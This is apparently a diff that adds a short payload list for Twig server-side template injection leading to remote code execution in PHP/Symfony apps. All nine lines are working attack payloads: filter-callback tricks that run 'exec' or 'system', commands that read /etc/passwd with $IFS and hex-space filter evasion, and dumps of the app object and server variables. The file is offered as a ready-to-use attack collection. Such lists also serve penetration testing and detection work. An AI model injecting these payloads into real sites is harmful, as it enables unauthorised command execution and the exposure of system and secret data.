@@ -1,0 +1,9 @@
+# Twig SSTI RCE (PHP/Symfony)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
